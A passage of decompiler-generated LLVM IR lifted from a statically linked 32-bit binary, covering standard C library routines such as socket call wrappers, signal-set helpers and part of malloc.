  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052693 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805269a = call i32 @__socketcall(i32 6, i32 %v2_8052693)
  ret i32 %v2_805269a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80526cf = ptrtoint i32* %stack_var_-20 to i32
  %v2_80526d6 = call i32 @__socketcall(i32 15, i32 %v2_80526cf)
  ret i32 %v2_80526d6

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052703 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805270a = call i32 @__socketcall(i32 10, i32 %v2_8052703)
  ret i32 %v2_805270a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8052737 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805273e = call i32 @__socketcall(i32 9, i32 %v2_8052737)
  ret i32 %v2_805273e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805277b = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052782 = call i32 @__socketcall(i32 11, i32 %v2_805277b)
  ret i32 %v2_8052782

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_80527b7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_80527be = call i32 @__socketcall(i32 14, i32 %v2_80527b7)
  ret i32 %v2_80527be

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80527e3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80527ea = call i32 @__socketcall(i32 1, i32 %v2_80527e3)
  ret i32 %v2_80527ea

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805280c, label %dec_label_pc_80527ff

dec_label_pc_80527ff:                             ; preds = %entry
  %v1_80527ff = add i32 %arg1, -64
  %v3_80527ff = sub i32 63, %arg1
  %v4_80527ff = and i32 %v3_80527ff, %arg1
  %v5_80527ff = icmp slt i32 %v4_80527ff, 0
  %v6_80527ff = icmp eq i32 %v1_80527ff, 0
  %v7_80527ff = icmp slt i32 %v1_80527ff, 0
  %v3_8052802 = icmp eq i1 %v7_80527ff, %v5_80527ff
  %v4_8052802 = icmp eq i1 %v6_80527ff, false
  %v5_8052802 = and i1 %v4_8052802, %v3_8052802
  br i1 %v5_8052802, label %dec_label_pc_805280c, label %dec_label_pc_8052804

dec_label_pc_8052804:                             ; preds = %dec_label_pc_80527ff
  %v4_8052807 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805280c

dec_label_pc_805280c:                             ; preds = %dec_label_pc_80527ff, %entry, %dec_label_pc_8052804
  %v1_805280c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8052811 = inttoptr i32 %v1_805280c to i32*
  store i32 22, i32* %v1_8052811, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80527ff, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805280c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805282e = inttoptr i32 %arg1 to i8*
  %v4_805282e = call i32 @__GI_memset(i8* %v3_805282e, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_805283c = load i32, i32* @ebx, align 4
  %v15_805283d = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8052851 = icmp eq i32 %arg2, -1
  br i1 %v10_8052851, label %dec_label_pc_805285f, label %dec_label_pc_8052856

dec_label_pc_8052856:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_805285f, label %dec_label_pc_805285a

dec_label_pc_805285a:                             ; preds = %dec_label_pc_8052856
  %v7_805285d = icmp sgt i32 %arg1, 64
  br i1 %v7_805285d, label %dec_label_pc_805285f, label %dec_label_pc_805286c

dec_label_pc_805285f:                             ; preds = %dec_label_pc_805285a, %dec_label_pc_8052856, %entry
  %v1_805285f = call i32 @__errno_location(i32 %v0_805283c)
  store i32 %v1_805285f, i32* %eax.global-to-local, align 4
  %v1_8052864 = inttoptr i32 %v1_805285f to i32*
  store i32 22, i32* %v1_8052864, align 4
  br label %dec_label_pc_80528e0

dec_label_pc_805286c:                             ; preds = %dec_label_pc_805285a
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805287a

dec_label_pc_805287a:                             ; preds = %dec_label_pc_805287a.dec_label_pc_805287a_crit_edge, %dec_label_pc_805286c
  %v0_805287a = phi i32 [ %v15_805283d, %dec_label_pc_805286c ], [ %v0_805287a.pre, %dec_label_pc_805287a.dec_label_pc_805287a_crit_edge ]
  %v1_805288517 = phi i32 [ 31, %dec_label_pc_805286c ], [ %v1_8052885, %dec_label_pc_805287a.dec_label_pc_805287a_crit_edge ]
  %v2_805287a = mul i32 %v1_805288517, 4
  %v3_805287a = add i32 %v2_805287a, 160
  %v4_805287a = add i32 %v3_805287a, %v0_805287a
  %v5_805287a = inttoptr i32 %v4_805287a to i32*
  store i32 0, i32* %v5_805287a, align 4
  %v0_8052885.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8052885 = add i32 %v0_8052885.pre, -1
  %v9_8052885 = icmp slt i32 %v1_8052885, 0
  store i32 %v1_8052885, i32* %eax.global-to-local, align 4
  %v1_8052886 = icmp eq i1 %v9_8052885, false
  br i1 %v1_8052886, label %dec_label_pc_805287a.dec_label_pc_805287a_crit_edge, label %dec_label_pc_8052888

dec_label_pc_805287a.dec_label_pc_805287a_crit_edge: ; preds = %dec_label_pc_805287a
  %v0_805287a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805287a

dec_label_pc_8052888:                             ; preds = %dec_label_pc_805287a
  %v0_8052888 = load i32, i32* @edx, align 4
  %v2_805288b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805288b, i32* %eax.global-to-local, align 4
  %v4_8052893 = call i32 @__sigaddset(i32 %v2_805288b, i32 %arg1, i32 %v0_8052888, i32 %v0_8052888)
  store i32 %v4_8052893, i32* %eax.global-to-local, align 4
  %v2_805289b = icmp slt i32 %v4_8052893, 0
  br i1 %v2_805289b, label %dec_label_pc_80528e0, label %dec_label_pc_805289f

dec_label_pc_805289f:                             ; preds = %dec_label_pc_8052888
  %v4_80528a7 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_80617e0.492 to i32), i32 %arg1, i32 %v4_8052893, i32 %v4_8052893)
  %v2_80528c0 = ptrtoint i32* %stack_var_-284 to i32
  %v2_80528c5 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80528c5, i32* %eax.global-to-local, align 4
  %v4_80528ce = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_80528c0)
  store i32 %v4_80528ce, i32* %eax.global-to-local, align 4
  %v2_80528d6 = icmp slt i32 %v4_80528ce, 0
  br i1 %v2_80528d6, label %dec_label_pc_80528e0, label %dec_label_pc_80528da

dec_label_pc_80528da:                             ; preds = %dec_label_pc_805289f
  %v3_80528da = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_80528e3

dec_label_pc_80528e0:                             ; preds = %dec_label_pc_805289f, %dec_label_pc_8052888, %dec_label_pc_805285f
  br label %dec_label_pc_80528e3

dec_label_pc_80528e3:                             ; preds = %dec_label_pc_80528da, %dec_label_pc_80528e0
  %storemerge = phi i32 [ -1, %dec_label_pc_80528e0 ], [ %v3_80528da, %dec_label_pc_80528da ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_805283c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052885, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 8, 9, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 4, 3, 1, 2, 0, 5 }
  uselistorder label %dec_label_pc_80528e3, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80528fa = add i32 %arg2, -1
  %v1_80528fd = urem i32 %v1_80528fa, 32
  %v2_80528fd = icmp eq i32 %v1_80528fd, 0
  %v2_8052900 = udiv i32 %v1_80528fa, 32
  br i1 %v2_80528fd, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8052903 = shl i32 1, %v1_80528fd
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052905 = phi i32 [ 1, %entry ], [ %v5_8052903, %bb ]
  %v2_8052905 = mul nuw nsw i32 %v2_8052900, 4
  %v3_8052905 = add i32 %v2_8052905, %arg1
  %v4_8052905 = inttoptr i32 %v3_8052905 to i32*
  %v5_8052905 = load i32, i32* %v4_8052905, align 4
  %v7_8052905 = and i32 %v5_8052905, %v6_8052905
  %v8_8052905 = icmp eq i32 %v7_8052905, 0
  %v1_8052909 = icmp eq i1 %v8_8052905, false
  %v2_8052909 = zext i1 %v1_8052909 to i32
  ret i32 %v2_8052909

; uselistorder directives
  uselistorder i32 %v1_80528fd, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052910 = load i32, i32* @ebx, align 4
  store i32 %v0_8052910, i32* %stack_var_-4, align 4
  %v1_805291e = add i32 %arg2, -1
  %v1_8052921 = urem i32 %v1_805291e, 32
  %v2_8052921 = icmp eq i32 %v1_8052921, 0
  store i32 %v1_8052921, i32* @ecx, align 4
  %v2_8052924 = udiv i32 %v1_805291e, 32
  store i32 %v2_8052924, i32* @edx, align 4
  br i1 %v2_8052921, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8052927 = shl i32 1, %v1_8052921
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052929 = phi i32 [ 1, %entry ], [ %v5_8052927, %bb ]
  %v2_8052929 = mul nuw nsw i32 %v2_8052924, 4
  %v3_8052929 = add i32 %v2_8052929, %arg1
  %v4_8052929 = inttoptr i32 %v3_8052929 to i32*
  %v5_8052929 = load i32, i32* %v4_8052929, align 4
  %v7_8052929 = or i32 %v5_8052929, %v6_8052929
  store i32 %v7_8052929, i32* %v4_8052929, align 4
  %v2_805292e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805292e, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8052924, { 1, 0 }
  uselistorder i32 %v1_8052921, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805293e = add i32 %arg2, -1
  %v1_8052941 = urem i32 %v1_805293e, 32
  %v2_8052941 = icmp eq i32 %v1_8052941, 0
  %v2_8052944 = udiv i32 %v1_805293e, 32
  br i1 %v2_8052941, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_8052947 = shl i32 -2, %v1_8052941
  %v5_8052947 = sub nsw i32 32, %v1_8052941
  %v6_8052947 = lshr i32 -2, %v5_8052947
  %v7_8052947 = or i32 %v6_8052947, %v4_8052947
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8052949 = phi i32 [ -2, %entry ], [ %v7_8052947, %bb ]
  %v2_8052949 = mul nuw nsw i32 %v2_8052944, 4
  %v3_8052949 = add i32 %v2_8052949, %arg1
  %v4_8052949 = inttoptr i32 %v3_8052949 to i32*
  %v5_8052949 = load i32, i32* %v4_8052949, align 4
  %v7_8052949 = and i32 %v5_8052949, %v6_8052949
  store i32 %v7_8052949, i32* %v4_8052949, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8052941, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8052950 = load i32, i32* @eax, align 4
  %v6_8052963 = icmp ugt i32 %v0_8052950, 16777215
  br i1 %v6_8052963, label %dec_label_pc_8052974, label %dec_label_pc_8052965

dec_label_pc_8052965:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8052950, 256
  %v2_8052953 = udiv i32 %v0_8052950, 256
  %v2_8052965 = call i32 @llvm.ctlz.i32(i32 %v2_8052953, i1 true)
  %v3_8052965 = xor i32 %v2_8052965, 31
  %v5_8052965 = select i1 %tmp, i32 95, i32 %v3_8052965
  %v1_8052968 = add nuw nsw i32 %v5_8052965, 6
  store i32 %v1_8052968, i32* @ecx, align 4
  %v2_805296b = urem i32 %v1_8052968, 32
  %v4_805296b = icmp eq i32 %v2_805296b, 0
  br i1 %v4_805296b, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052965
  %v5_805296b = lshr i32 %v0_8052950, %v2_805296b
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052965, %bb
  %v0_805296d = phi i32 [ %v0_8052950, %dec_label_pc_8052965 ], [ %v5_805296b, %bb ]
  %v1_805296d = urem i32 %v0_805296d, 4
  %v2_8052970 = mul nuw nsw i32 %v5_8052965, 4
  %v3_8052970 = or i32 %v1_805296d, 32
  %v4_8052970 = add nuw nsw i32 %v3_8052970, %v2_8052970
  br label %dec_label_pc_8052974

dec_label_pc_8052974:                             ; preds = %entry, %bb4
  %v0_8052975 = phi i32 [ 95, %entry ], [ %v4_8052970, %bb4 ]
  ret i32 %v0_8052975

; uselistorder directives
  uselistorder i32 %v2_805296b, { 1, 0 }
  uselistorder i32 %v0_8052950, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8052974, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052976 = load i32, i32* @ebp, align 4
  %v0_8052977 = load i32, i32* @edi, align 4
  %v0_8052978 = load i32, i32* @esi, align 4
  %v0_8052979 = load i32, i32* @ebx, align 4
  store i32 %v0_8052979, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_805298b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805298b, i32* @eax, align 4
  store i32 %v2_805298b, i32* %stack_var_-92, align 4
  %v2_8052990 = call i32 @__pthread_return_void(i32 %v2_805298b, i32 134562611)
  store i32 %v2_8052990, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b3f0.493 to i32), i32* %stack_var_-92, align 4
  %v1_805299c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3f0.493 to i32))
  store i32 %v1_805299c, i32* %eax.global-to-local, align 4
  %v0_80529a4 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_80529a4, -32
  br i1 %tmp125, label %dec_label_pc_80529bb, label %dec_label_pc_80529a9

dec_label_pc_80529a9:                             ; preds = %entry
  %v0_80529a9 = load i32, i32* %stack_var_-92, align 4
  %v1_80529a9 = call i32 @__errno_location(i32 %v0_80529a9)
  store i32 %v1_80529a9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_80529b0 = inttoptr i32 %v1_80529a9 to i32*
  store i32 12, i32* %v1_80529b0, align 4
  br label %dec_label_pc_80530e0

dec_label_pc_80529bb:                             ; preds = %entry
  %v1_80529bb = add i32 %v0_80529a4, 11
  %tmp126 = icmp ult i32 %v1_80529bb, 16
  br i1 %tmp126, label %dec_label_pc_80529d2, label %dec_label_pc_80529cb

dec_label_pc_80529cb:                             ; preds = %dec_label_pc_80529bb
  %v1_80529cb = and i32 %v1_80529bb, -8
  br label %dec_label_pc_80529d2

dec_label_pc_80529d2:                             ; preds = %dec_label_pc_80529bb, %dec_label_pc_80529cb
  %storemerge136 = phi i32 [ %v1_80529cb, %dec_label_pc_80529cb ], [ %v1_80529bb, %dec_label_pc_80529bb ]
  %v1_8052d6a = phi i32 [ %v1_80529cb, %dec_label_pc_80529cb ], [ 16, %dec_label_pc_80529bb ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_80529d2 = load i8, i8* @global_var_8061860.494, align 1
  %v1_80529d2 = sext i8 %v0_80529d2 to i32
  store i32 %v1_80529d2, i32* @ebx, align 4
  %v3_80529d8 = urem i8 %v0_80529d2, 2
  %v4_80529d8 = icmp eq i8 %v3_80529d8, 0
  %v1_80529db = icmp eq i1 %v4_80529d8, false
  br i1 %v1_80529db, label %dec_label_pc_80529fa, label %dec_label_pc_80529dd

dec_label_pc_80529dd:                             ; preds = %dec_label_pc_80529d2
  %v2_80529dd = icmp eq i8 %v0_80529d2, 0
  %v1_80529df = icmp eq i1 %v2_80529dd, false
  br i1 %v1_80529df, label %dec_label_pc_8052cd5, label %dec_label_pc_80529e5

dec_label_pc_80529e5:                             ; preds = %dec_label_pc_80529dd
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* %stack_var_-92, align 4
  %v2_80529ed = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 %v2_80529ed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052cd5

dec_label_pc_80529fa:                             ; preds = %dec_label_pc_80529d2
  %v11_80529fa = trunc i32 %v1_8052d6a to i8
  %v8_80529fe = icmp ugt i8 %v11_80529fa, %v0_80529d2
  br i1 %v8_80529fe, label %dec_label_pc_8052a1b, label %dec_label_pc_8052a00

dec_label_pc_8052a00:                             ; preds = %dec_label_pc_80529fa
  %v2_8052a04 = udiv i32 %v1_8052d6a, 2
  store i32 %v2_8052a04, i32* %eax.global-to-local, align 4
  %v1_8052a06 = add i32 %v2_8052a04, ptrtoint (i8* @global_var_8061860.494 to i32)
  store i32 %v1_8052a06, i32* @ecx, align 4
  %v1_8052a0c = add i32 %v2_8052a04, add (i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32 -4)
  %v2_8052a0c = inttoptr i32 %v1_8052a0c to i32*
  %v3_8052a0c = load i32, i32* %v2_8052a0c, align 4
  store i32 %v3_8052a0c, i32* @edx, align 4
  %v1_8052a0f = icmp eq i32 %v3_8052a0c, 0
  br i1 %v1_8052a0f, label %dec_label_pc_8052a1b, label %dec_label_pc_8052a13

dec_label_pc_8052a13:                             ; preds = %dec_label_pc_8052a00
  %v1_8052a13 = add i32 %v3_8052a0c, 8
  %v2_8052a13 = inttoptr i32 %v1_8052a13 to i32*
  %v3_8052a13 = load i32, i32* %v2_8052a13, align 4
  store i32 %v3_8052a13, i32* %eax.global-to-local, align 4
  store i32 %v3_8052a13, i32* %v2_8052a0c, align 4
  br label %dec_label_pc_8052a54

dec_label_pc_8052a1b:                             ; preds = %dec_label_pc_8052a00, %dec_label_pc_80529fa
  %v8_8052a1b = icmp ult i32 %v1_8052d6a, 255
  %v6_8052a23 = icmp ugt i32 %v1_8052d6a, 255
  store i32 %v1_8052d6a, i32* @eax, align 4
  br i1 %v6_8052a23, label %dec_label_pc_8052a5c, label %dec_label_pc_8052a25

dec_label_pc_8052a25:                             ; preds = %dec_label_pc_8052a1b
  %v2_8052a29 = udiv i32 %v1_8052d6a, 8
  store i32 %v2_8052a29, i32* %eax.global-to-local, align 4
  %v1_8052a30 = mul nuw i32 %v2_8052a29, 8
  %v2_8052a30 = add i32 %v1_8052a30, ptrtoint (i32* @global_var_806188c.495 to i32)
  store i32 %v2_8052a30, i32* @ecx, align 4
  %v1_8052a37 = add i32 %v1_8052a30, add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12)
  %v2_8052a37 = inttoptr i32 %v1_8052a37 to i32*
  %v3_8052a37 = load i32, i32* %v2_8052a37, align 4
  store i32 %v3_8052a37, i32* @edx, align 4
  %v12_8052a3a = icmp eq i32 %v3_8052a37, %v2_8052a30
  br i1 %v12_8052a3a, label %dec_label_pc_8052b58.preheader, label %dec_label_pc_8052a42

dec_label_pc_8052a42:                             ; preds = %dec_label_pc_8052a25
  store i32 %v1_8052d6a, i32* %ebx.global-to-local, align 4
  %v1_8052a46 = add i32 %v3_8052a37, 12
  %v2_8052a46 = inttoptr i32 %v1_8052a46 to i32*
  %v3_8052a46 = load i32, i32* %v2_8052a46, align 4
  store i32 %v3_8052a46, i32* %eax.global-to-local, align 4
  store i32 %v3_8052a46, i32* %v2_8052a37, align 4
  %v0_8052a4c = load i32, i32* @edx, align 4
  %v1_8052a4c = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052a4c = add i32 %v0_8052a4c, 4
  %v3_8052a4c = add i32 %v2_8052a4c, %v1_8052a4c
  %v4_8052a4c = inttoptr i32 %v3_8052a4c to i32*
  %v5_8052a4c = load i32, i32* %v4_8052a4c, align 4
  %v6_8052a4c = or i32 %v5_8052a4c, 1
  store i32 %v6_8052a4c, i32* %v4_8052a4c, align 4
  %v0_8052a51 = load i32, i32* @ecx, align 4
  %v1_8052a51 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052a51 = add i32 %v1_8052a51, 8
  %v3_8052a51 = inttoptr i32 %v2_8052a51 to i32*
  store i32 %v0_8052a51, i32* %v3_8052a51, align 4
  br label %dec_label_pc_8052a54

dec_label_pc_8052a54:                             ; preds = %dec_label_pc_8052df1, %dec_label_pc_8052e03, %dec_label_pc_8052a13, %dec_label_pc_8052a42
  %v0_8052a54 = load i32, i32* @edx, align 4
  %v1_8052a54 = add i32 %v0_8052a54, 8
  store i32 %v1_8052a54, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80530cf

dec_label_pc_8052a5c:                             ; preds = %dec_label_pc_8052a1b
  %v0_8052a60 = call i32 @__malloc_largebin_index()
  store i32 %v0_8052a60, i32* %eax.global-to-local, align 4
  %v3_8052a65 = and i8 %v0_80529d2, 2
  %v4_8052a65 = icmp eq i8 %v3_8052a65, 0
  %v6_8052a65 = zext i8 %v3_8052a65 to i32
  %v9_8052a65 = and i32 %v1_80529d2, -256
  %v10_8052a65 = or i32 %v9_8052a65, %v6_8052a65
  store i32 %v10_8052a65, i32* @ebx, align 4
  br i1 %v4_8052a65, label %dec_label_pc_8052b58.preheader, label %dec_label_pc_8052a72

dec_label_pc_8052a72:                             ; preds = %dec_label_pc_8052a5c
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* %stack_var_-92, align 4
  %v2_8052a7a = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061860.494 to i32*))
  store i32 %v2_8052a7a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b58.preheader

dec_label_pc_8052b58.preheader:                   ; preds = %dec_label_pc_8052a72, %dec_label_pc_8052a25, %dec_label_pc_8052a5c
  %stack_var_-40.0.ph = phi i32 [ %v2_8052a29, %dec_label_pc_8052a25 ], [ %v0_8052a60, %dec_label_pc_8052a72 ], [ %v0_8052a60, %dec_label_pc_8052a5c ]
  %v1_8052aae = add i32 %v1_8052d6a, 16
  %v0_8052b58107 = load i32, i32* @global_var_80618a0.498, align 32
  store i32 %v0_8052b58107, i32* @ebp, align 4
  %v9_8052b5e109 = icmp eq i32 %v0_8052b58107, 134617236
  %v1_8052b64110 = icmp eq i1 %v9_8052b5e109, false
  br i1 %v1_8052b64110, label %dec_label_pc_8052a87, label %dec_label_pc_8052b6a

dec_label_pc_8052a87:                             ; preds = %dec_label_pc_8052b58.preheader, %bb84
  %v0_8052b58111 = phi i32 [ %v0_8052b58, %bb84 ], [ %v0_8052b58107, %dec_label_pc_8052b58.preheader ]
  %v1_8052a87 = add i32 %v0_8052b58111, 4
  %v2_8052a87 = inttoptr i32 %v1_8052a87 to i32*
  %v3_8052a87 = load i32, i32* %v2_8052a87, align 4
  %v1_8052a8a = add i32 %v0_8052b58111, 12
  %v2_8052a8a = inttoptr i32 %v1_8052a8a to i32*
  %v3_8052a8a = load i32, i32* %v2_8052a8a, align 4
  store i32 %v3_8052a8a, i32* @edx, align 4
  %v1_8052a8d = and i32 %v3_8052a87, -4
  store i32 %v1_8052a8d, i32* @edi, align 4
  br i1 %v6_8052a23, label %dec_label_pc_8052ab9, label %dec_label_pc_8052a9a

dec_label_pc_8052a9a:                             ; preds = %dec_label_pc_8052a87
  %v9_8052a9a = icmp eq i32 %v3_8052a8a, 134617236
  %v1_8052aa0 = icmp eq i1 %v9_8052a9a, false
  br i1 %v1_8052aa0, label %dec_label_pc_8052ab9, label %dec_label_pc_8052aa2

dec_label_pc_8052aa2:                             ; preds = %dec_label_pc_8052a9a
  %v1_8052aa2 = load i32, i32* @global_var_8061890.496, align 16
  %v12_8052aa2 = icmp eq i32 %v0_8052b58111, %v1_8052aa2
  %v1_8052aa8 = icmp eq i1 %v12_8052aa2, false
  br i1 %v1_8052aa8, label %dec_label_pc_8052ab9, label %dec_label_pc_8052aaa

dec_label_pc_8052aaa:                             ; preds = %dec_label_pc_8052aa2
  store i32 %v1_8052aae, i32* %eax.global-to-local, align 4
  %v6_8052ab3 = icmp ugt i32 %v1_8052a8d, %v1_8052aae
  br i1 %v6_8052ab3, label %dec_label_pc_805306a, label %dec_label_pc_8052ab9

dec_label_pc_8052ab9:                             ; preds = %dec_label_pc_8052aaa, %dec_label_pc_8052aa2, %dec_label_pc_8052a9a, %dec_label_pc_8052a87
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %eax.global-to-local, align 4
  %v2_8052abe = add i32 %v3_8052a8a, 8
  %v3_8052abe = inttoptr i32 %v2_8052abe to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v3_8052abe, align 4
  %v0_8052ac1 = load i32, i32* @edx, align 4
  store i32 %v0_8052ac1, i32* @global_var_80618a0.498, align 4
  %v0_8052ac4 = load i32, i32* @edi, align 4
  %v15_8052ac4 = icmp eq i32 %v0_8052ac4, %v1_8052d6a
  br i1 %v15_8052ac4, label %dec_label_pc_80530ab, label %dec_label_pc_8052ace

dec_label_pc_8052ace:                             ; preds = %dec_label_pc_8052ab9
  %v6_8052ad4 = icmp ugt i32 %v0_8052ac4, 255
  br i1 %v6_8052ad4, label %dec_label_pc_8052ae7, label %dec_label_pc_8052ad6

dec_label_pc_8052ad6:                             ; preds = %dec_label_pc_8052ace
  %v2_8052ad8 = udiv i32 %v0_8052ac4, 8
  store i32 %v2_8052ad8, i32* %esi.global-to-local, align 4
  %v1_8052adb = mul nuw i32 %v2_8052ad8, 8
  %v2_8052adb = add i32 %v1_8052adb, 134617228
  store i32 %v2_8052adb, i32* @ebx, align 4
  %v1_8052ae2 = add i32 %v1_8052adb, 134617236
  %v2_8052ae2 = inttoptr i32 %v1_8052ae2 to i32*
  %v3_8052ae2 = load i32, i32* %v2_8052ae2, align 4
  store i32 %v3_8052ae2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052b30

dec_label_pc_8052ae7:                             ; preds = %dec_label_pc_8052ace
  store i32 %v0_8052ac4, i32* @eax, align 4
  %v0_8052ae9 = call i32 @__malloc_largebin_index()
  store i32 %v0_8052ae9, i32* %esi.global-to-local, align 4
  %v1_8052af0 = mul i32 %v0_8052ae9, 8
